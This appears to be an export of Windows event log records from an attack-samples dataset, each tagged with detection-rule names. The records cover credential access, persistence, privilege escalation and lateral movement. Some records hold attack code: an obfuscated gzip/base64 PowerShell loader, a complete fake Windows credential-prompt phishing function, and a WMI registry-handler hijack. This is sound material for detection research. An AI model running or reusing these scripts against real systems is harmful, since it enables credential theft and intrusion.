ScriptBlockText: '&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAAlVdl0CA81UXW/aMBR996+4svJANJIfgNQHBNs6aaWIsO2hnSbXuaVeEzuyHdKI8d93YwIDTUJlfVkeLPme+3F87lEeay29Mho+6bV5xuSzWSk9t6as/IZF0mIOVxBdG+fTWqU74IOxEwJQeyWKAf+mdG4aBxnK2irf8iHweYHCIVAKWqgdHfJQ4bqECPV61AG5KYXS94e7FiXyIecxi/ZXYsBPcRbtyk6QXYiwx7ooAtJH4B3w+3BGRx0q4VxjbHhfRy79iH6GnkLPR6+L030eG+d5smwrhIQiWD4UbSCXtc5jmU6VRemNbTO0ayXRpWMpTa39jdBihSX1Y9E0o2kzbJLbh5+UfUEtSa+0VJUoJoZEffGDuwuK+5qO/ffR6EbIJ6UxZs2TKnBArNKvolC58Pjn5W7Ag5C0i4NUPIZEI0RLW2O8YUDfv1uEDNcNhaORQ+h9420LYtXt7nVWCUzO2CXgZywT8FfZJmRebJ2u6u32CbP/Mwv1nM4aCE4c9AtM7RNNSCjeMogoUNW+U1NjszfUGWGph8OCKCdmJ8IX2s+M1BzCNOyOjHSQvu/OYLHJluPF8sd8cTt5n2VbtmV///R+A6HMO3IQBQAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'
ScriptBlockId: 37f6d110-cfdf-4118-8748-17638e258531
MessageTotal: 1
Path: ''
"
2019-09-09T13:35:09.315230+00:00,Manipulation of User Computer or Group Security Principals Across AD;PowerShell Credential Prompt;Suspicious PowerShell Get Current User,data/EVTX-ATTACK-SAMPLES/Credential Access/phish_windows_credentials_powershell_scriptblockLog_4104.evtx,1,Microsoft-Windows-PowerShell,4104,1123,MSEDGEWIN10,"MessageNumber: 1
ScriptBlockText: |-
  function Invoke-LoginPrompt{
  $cred = $Host.ui.PromptForCredential(""Windows Security"", ""Please enter user credentials"", ""$env:userdomain\$env:username"","""")
  $username = ""$env:username""
  $domain = ""$env:userdomain""
  $full = ""$domain"" + ""\"" + ""$username""
  $password = $cred.GetNetworkCredential().password
  Add-Type -assemblyname System.DirectoryServices.AccountManagement
  $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
  while($DS.ValidateCredentials(""$full"",""$password"") -ne $True){
      $cred = $Host.ui.PromptForCredential(""Windows Security"", ""Invalid Credentials, Please try again"", ""$env:userdomain\$env:username"","""")
      $username = ""$env:username""
      $domain = ""$env:userdomain""
      $full = ""$domain"" + ""\"" + ""$username""
      $password = $cred.GetNetworkCredential().password
      Add-Type -assemblyname System.DirectoryServices.AccountManagement
      $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
      $DS.ValidateCredentials(""$full"", ""$password"") | out-null
      }
   $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
   $output
   R{START_PROCESS}
  }
  Invoke-LoginPrompt
ScriptBlockId: c7ca7056-b317-4fff-b796-05d8ef896dcd
MessageTotal: 1
Path: ''
"
2019-09-22T11:22:05.201727+00:00,User Added to Local Administrator Group,data/EVTX-ATTACK-SAMPLES/Persistence/Network_Service_Guest_added_to_admins_4732.evtx,1,Microsoft-Windows-Security-Auditing,4732,191029,MSEDGEWIN10,"MemberName: '-'
MemberSid: S-1-5-21-3461203602-4096304019-2269080069-501
PrivilegeList: '-'
SubjectDomainName: MSEDGEWIN10
TargetDomainName: Builtin
SubjectUserSid: S-1-5-21-3461203602-4096304019-2269080069-1000
TargetUserName: Administrators
TargetSid: S-1-5-32-544
SubjectLogonId: '0x27a10f'
SubjectUserName: IEUser
"
2019-09-22T11:23:19.251925+00:00,User Added to Local Administrator Group,data/EVTX-ATTACK-SAMPLES/Persistence/Network_Service_Guest_added_to_admins_4732.evtx,1,Microsoft-Windows-Security-Auditing,4732,191030,MSEDGEWIN10,"MemberName: '-'
MemberSid: S-1-5-20
PrivilegeList: '-'
SubjectDomainName: MSEDGEWIN10
TargetDomainName: Builtin
SubjectUserSid: S-1-5-21-3461203602-4096304019-2269080069-1000
TargetUserName: Administrators
TargetSid: S-1-5-32-544
SubjectLogonId: '0x27a10f'
SubjectUserName: IEUser
"
2019-11-03T13:51:58.263043+00:00,Hacktool - EDR-Freeze Execution;Potentially Suspicious CMD Shell Output Redirect;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/sysmon_1_exec_via_sql_xpcmdshell.evtx,1,Microsoft-Windows-Sysmon,1,56509,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 0
ParentCommandLine: '""c:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe"" -sSQLEXPRESS'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3936
LogonGuid: 747F3D96-CE3B-5DBE-0000-00201ED50100
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-CE42-5DBE-0000-0010EE430200
ProcessId: 5004
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-DB7C-5DBE-0000-0010CF6B9502
CommandLine: '""C:\Windows\system32\cmd.exe"" /c set > c:\users\\public\netstat.txt'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\sqlsvc
LogonId: '0x1d51e'
IntegrityLevel: High
ParentImage: C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe
UtcTime: 2019-11-03 13:51:56.380
"
2019-11-04T13:46:01.171339+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13026,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - sa
  - ' Reason: Password did not match that for the login provided.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.187637+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13027,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_SQLResourceSigningCertificate##'
  - ' Reason: Attempting to use an NT account name with SQL Server Authentication.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.202731+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13028,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_SQLReplicationSigningCertificate##'
  - ' Reason: Attempting to use an NT account name with SQL Server Authentication.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.202731+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13029,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_SQLAuthenticatorCertificate##'
  - ' Reason: Attempting to use an NT account name with SQL Server Authentication.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.222452+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13030,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_PolicySigningCertificate##'
  - ' Reason: Attempting to use an NT account name with SQL Server Authentication.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.233944+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13031,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_SmoExtendedSigningCertificate##'
  - ' Reason: Attempting to use an NT account name with SQL Server Authentication.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.248423+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13032,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_PolicyEventProcessingLogin##'
  - ' Reason: An error occurred while evaluating the password.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.248883+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13033,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_PolicyTsqlExecutionLogin##'
  - ' Reason: An error occurred while evaluating the password.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.266435+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13034,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - '##MS_AgentSigningCertificate##'
  - ' Reason: Attempting to use an NT account name with SQL Server Authentication.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-04T13:46:01.279825+00:00,MSSQL Server Failed Logon,data/EVTX-ATTACK-SAMPLES/Credential Access/MSSQL_multiple_failed_logon_EventID_18456.evtx,1,MSSQLSERVER,18456,13035,MSEDGEWIN10,"Binary: 184800000E0000000C0000004D0053004500440047004500570049004E00310030000000070000006D00610073007400650072000000
Data:
  '#text':
  - root
  - ' Reason: Password did not match that for the login provided.'
  - ' [CLIENT: 10.0.2.17]'
"
2019-11-15T08:19:16.102509+00:00,RottenPotato Like Attack Pattern,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/4624 LT3 AnonymousLogon Localhost - JuicyPotato.evtx,1,Microsoft-Windows-Security-Auditing,4624,25049,alice.insecurebank.local,"AuthenticationPackageName: NTLM
LogonProcessName: 'NtLmSsp '
IpAddress: 127.0.0.1
KeyLength: 128
TargetDomainName: NT AUTHORITY
SubjectLogonId: '0x0'
TargetLogonId: '0x1d12916'
LogonGuid: 00000000-0000-0000-0000-000000000000
SubjectDomainName: '-'
LogonType: 3
WorkstationName: '-'
SubjectUserSid: S-1-0-0
TransmittedServices: '-'
ProcessId: '0x0'
IpPort: '59336'
ImpersonationLevel: '%%1833'
TargetUserName: ANONYMOUS LOGON
ProcessName: '-'
LmPackageName: NTLM V1
SubjectUserName: '-'
TargetUserSid: S-1-5-7
"
2019-11-15T08:19:17.134469+00:00,User Logoff Event,data/EVTX-ATTACK-SAMPLES/Privilege Escalation/4624 LT3 AnonymousLogon Localhost - JuicyPotato.evtx,1,Microsoft-Windows-Security-Auditing,4634,25050,alice.insecurebank.local,"TargetUserName: ANONYMOUS LOGON
LogonType: 3
TargetUserSid: S-1-5-7
TargetDomainName: NT AUTHORITY
TargetLogonId: '0x1d12916'
"
2020-01-14T20:44:46.414860+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,13,335,MSEDGEWIN10,"Image: C:\Windows\system32\wbem\wmiprvse.exe
TargetObject: HKCR\ms-browser\shell\open\command\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 3388
ProcessGuid: 747F3D96-283E-5E1E-0000-0010772C7A00
UtcTime: 2020-01-14 20:44:46.393
Details: cmd.exe /c notepad.exe
"
2020-01-14T20:44:50.353148+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;Potentially Suspicious Rundll32 Activity;Suspicious WmiPrvSE Child Process;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,336,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
OriginalFileName: RUNDLL32.EXE
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1628
LogonGuid: 747F3D96-2842-5E1E-0000-0020FF3A7A00
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-2842-5E1E-0000-0010903C7A00
ProcessId: 4180
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-2842-5E1E-0000-00100C417A00
CommandLine: rundll32 url.dll,FileProtocolHandler ms-browser://
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7a3aff'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2020-01-14 20:44:50.348
"
2020-01-14T20:44:51.016110+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,337,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
OriginalFileName: Cmd.Exe
TerminalSessionId: 0
ParentCommandLine: rundll32 url.dll,FileProtocolHandler ms-browser://
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4180
LogonGuid: 747F3D96-2842-5E1E-0000-0020FF3A7A00
Hashes: SHA1=08CC2E8DCA652BDDA1ACCA9C446560D4BC1BCDF9,MD5=0D088F5BCFA8F086FBA163647CD80CAB,SHA256=9023F8AAEDA4A1DA45AC477A81B5BBE4128E413F19A0ABFA3715465AD66ED5CD,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-2842-5E1E-0000-00100C417A00
ProcessId: 1568
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-2842-5E1E-0000-0010745E7A00
CommandLine: '""cmd.exe"" /c notepad.exe'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7a3aff'
IntegrityLevel: High
ParentImage: C:\Windows\System32\rundll32.exe
UtcTime: 2020-01-14 20:44:50.978
"
2020-01-14T20:44:51.122589+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,338,MSEDGEWIN10,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
OriginalFileName: NOTEPAD.EXE
TerminalSessionId: 0
ParentCommandLine: '""cmd.exe"" /c notepad.exe'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1568
LogonGuid: 747F3D96-2842-5E1E-0000-0020FF3A7A00
Hashes: SHA1=60733DE225B5C4BFC42FB79E5D1A4F6683243E4A,MD5=782877B30735ABD1EAE241F13145F664,SHA256=E46B3CA5A0EBB4A6979F852F50E22BD08C9F2D0206CC04383978BE0172AC88EE,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E
ParentProcessGuid: 747F3D96-2842-5E1E-0000-0010745E7A00
ProcessId: 676
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-2843-5E1E-0000-0010B1687A00
CommandLine: notepad.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7a3aff'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2020-01-14 20:44:51.118
"
2020-01-14T20:46:39.313281+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,13,339,MSEDGEWIN10,"Image: C:\Windows\system32\wbem\wmiprvse.exe
TargetObject: HKCR\ms-browser\shell\open\command\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 4052
ProcessGuid: 747F3D96-28AF-5E1E-0000-00103FD77B00
UtcTime: 2020-01-14 20:46:39.297
Details: cmd.exe /c notepad.exe
"
2020-01-14T20:46:43.237922+00:00,CobaltStrike Load by Rundll32;Hacktool - EDR-Freeze Execution;Potentially Suspicious Rundll32 Activity;Suspicious WmiPrvSE Child Process;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,340,MSEDGEWIN10,"Image: C:\Windows\System32\rundll32.exe
RuleName: ''
Description: Windows host process (Rundll32)
OriginalFileName: RUNDLL32.EXE
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1632
LogonGuid: 747F3D96-28B3-5E1E-0000-002057EB7B00
Hashes: SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A
ParentProcessGuid: 747F3D96-28B3-5E1E-0000-0010CAEC7B00
ProcessId: 3412
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-28B3-5E1E-0000-00101DF17B00
CommandLine: rundll32 url.dll,OpenURL ms-browser://
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7beb57'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2020-01-14 20:46:43.232
"
2020-01-14T20:46:43.819347+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,341,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
OriginalFileName: Cmd.Exe
TerminalSessionId: 0
ParentCommandLine: rundll32 url.dll,OpenURL ms-browser://
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3412
LogonGuid: 747F3D96-28B3-5E1E-0000-002057EB7B00
Hashes: SHA1=08CC2E8DCA652BDDA1ACCA9C446560D4BC1BCDF9,MD5=0D088F5BCFA8F086FBA163647CD80CAB,SHA256=9023F8AAEDA4A1DA45AC477A81B5BBE4128E413F19A0ABFA3715465AD66ED5CD,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-28B3-5E1E-0000-00101DF17B00
ProcessId: 1656
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-28B3-5E1E-0000-001032047C00
CommandLine: '""cmd.exe"" /c notepad.exe'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7beb57'
IntegrityLevel: High
ParentImage: C:\Windows\System32\rundll32.exe
UtcTime: 2020-01-14 20:46:43.675
"
2020-01-14T20:46:43.836400+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,342,MSEDGEWIN10,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
OriginalFileName: NOTEPAD.EXE
TerminalSessionId: 0
ParentCommandLine: '""cmd.exe"" /c notepad.exe'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1656
LogonGuid: 747F3D96-28B3-5E1E-0000-002057EB7B00
Hashes: SHA1=60733DE225B5C4BFC42FB79E5D1A4F6683243E4A,MD5=782877B30735ABD1EAE241F13145F664,SHA256=E46B3CA5A0EBB4A6979F852F50E22BD08C9F2D0206CC04383978BE0172AC88EE,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E
ParentProcessGuid: 747F3D96-28B3-5E1E-0000-001032047C00
ProcessId: 2964
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-28B3-5E1E-0000-0010900A7C00
CommandLine: notepad.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7beb57'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2020-01-14 20:46:43.746
"
2020-01-14T20:48:13.125541+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,13,343,MSEDGEWIN10,"Image: C:\Windows\system32\wbem\wmiprvse.exe
TargetObject: HKCR\ms-browser\shell\open\command\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 4388
ProcessGuid: 747F3D96-290D-5E1E-0000-00100DE97C00
UtcTime: 2020-01-14 20:48:13.110
Details: cmd.exe /c notepad.exe
"
2020-01-14T20:48:17.044002+00:00,HackTool - CrackMapExec Process Patterns;Hacktool - EDR-Freeze Execution;Operator Bloopers Cobalt Strike Commands;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,344,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
OriginalFileName: Cmd.Exe
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4612
LogonGuid: 747F3D96-2910-5E1E-0000-002082EF7C00
Hashes: SHA1=08CC2E8DCA652BDDA1ACCA9C446560D4BC1BCDF9,MD5=0D088F5BCFA8F086FBA163647CD80CAB,SHA256=9023F8AAEDA4A1DA45AC477A81B5BBE4128E413F19A0ABFA3715465AD66ED5CD,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-2910-5E1E-0000-0010F5F07C00
ProcessId: 4448
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-2910-5E1E-0000-001053F57C00
CommandLine: cmd.exe /c start ms-browser://
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7cef82'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2020-01-14 20:48:16.990
"
2020-01-14T20:48:17.412145+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,345,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
OriginalFileName: Cmd.Exe
TerminalSessionId: 0
ParentCommandLine: cmd.exe /c start ms-browser://
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4448
LogonGuid: 747F3D96-2910-5E1E-0000-002082EF7C00
Hashes: SHA1=08CC2E8DCA652BDDA1ACCA9C446560D4BC1BCDF9,MD5=0D088F5BCFA8F086FBA163647CD80CAB,SHA256=9023F8AAEDA4A1DA45AC477A81B5BBE4128E413F19A0ABFA3715465AD66ED5CD,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-2910-5E1E-0000-001053F57C00
ProcessId: 2416
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-2911-5E1E-0000-0010D80A7D00
CommandLine: '""cmd.exe"" /c notepad.exe'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7cef82'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2020-01-14 20:48:17.270
"
2020-01-14T20:48:17.447948+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,346,MSEDGEWIN10,"Image: C:\Windows\System32\notepad.exe
RuleName: ''
Description: Notepad
OriginalFileName: NOTEPAD.EXE
TerminalSessionId: 0
ParentCommandLine: '""cmd.exe"" /c notepad.exe'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 2416
LogonGuid: 747F3D96-2910-5E1E-0000-002082EF7C00
Hashes: SHA1=60733DE225B5C4BFC42FB79E5D1A4F6683243E4A,MD5=782877B30735ABD1EAE241F13145F664,SHA256=E46B3CA5A0EBB4A6979F852F50E22BD08C9F2D0206CC04383978BE0172AC88EE,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E
ParentProcessGuid: 747F3D96-2911-5E1E-0000-0010D80A7D00
ProcessId: 1344
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-2911-5E1E-0000-00109C137D00
CommandLine: notepad.exe
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7cef82'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2020-01-14 20:48:17.363
"
2020-01-14T20:48:41.336042+00:00,Potential Persistence Using DebugPath,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,13,347,MSEDGEWIN10,"Image: C:\Windows\system32\wbem\wmiprvse.exe
TargetObject: HKCR\ms-browser\shell\open\command\(Default)
RuleName: ''
EventType: SetValue
ProcessId: 4388
ProcessGuid: 747F3D96-290D-5E1E-0000-00100DE97C00
UtcTime: 2020-01-14 20:48:41.329
Details: cmd.exe /c notepad.exe
"
2020-01-14T20:48:45.243751+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process;WmiPrvSE Spawned A Process,data/EVTX-ATTACK-SAMPLES/Lateral Movement/LM_wmi_PoisonHandler_Mr-Un1k0d3r_sysmon_1_13.evtx,1,Microsoft-Windows-Sysmon,1,348,MSEDGEWIN10,"Image: C:\Windows\explorer.exe
RuleName: ''
Description: Windows Explorer
OriginalFileName: EXPLORER.EXE
TerminalSessionId: 0
ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4612
LogonGuid: 747F3D96-292D-5E1E-0000-0020CD587D00
Hashes: SHA1=3EB9D6F8F4448CB1FD6478189EDEBE3D70477EA7,MD5=2F62005FCEA7430BB871A56F7700F81C,SHA256=B759293373A11D1A972873A902BC64B2C9690AB947CE4A185CD047195521296D,IMPHASH=0B98A47B3DAF2EE45939EF2A0F188959
ParentProcessGuid: 747F3D96-2910-5E1E-0000-0010F5F07C00
ProcessId: 3828
CurrentDirectory: C:\Windows\system32\
ProcessGuid: 747F3D96-292D-5E1E-0000-0010F5597D00
CommandLine: explorer ms-browser://
FileVersion: 10.0.17763.348 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x7d58cd'
IntegrityLevel: High
ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
UtcTime: 2020-01-14 20:48:45.193
"
